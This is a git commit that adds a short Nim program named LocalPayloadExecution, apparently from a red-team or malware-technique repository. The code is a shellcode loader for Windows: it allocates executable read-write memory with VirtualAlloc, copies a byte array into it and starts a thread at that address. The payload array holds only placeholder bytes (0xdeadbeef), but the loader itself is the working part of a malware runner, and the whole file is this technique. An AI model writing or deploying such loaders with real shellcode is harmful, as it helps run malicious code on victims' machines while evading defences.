e3ee684dae6b02c3bb15897594652eacb353ad09
KrknSec <paul.daubman@mymail.champlain.edu>
2023-10-15 14:49:43 -0400

    Create LocalPayloadExecution.nim

---
+++ Local Payload Execution/Nim/LocalPayloadExecution.nim
@@ -0,0 +1,14 @@
+import winim/lean
+
+var data: array[276,byte] = [
+    byte 0xde,0xad,0xbe,0xef
+]
+
+var bufAddress = VirtualAlloc(NULL, cast[SIZE_T](data.len), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+
+copyMem(bufAddress, addr(data), cast[SIZE_T](data.len))
+
+var hThread = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](bufAddress), NULL, 0, NULL)
+
+WaitForSingleObject(hThread, -1)
+CloseHandle(hThread)
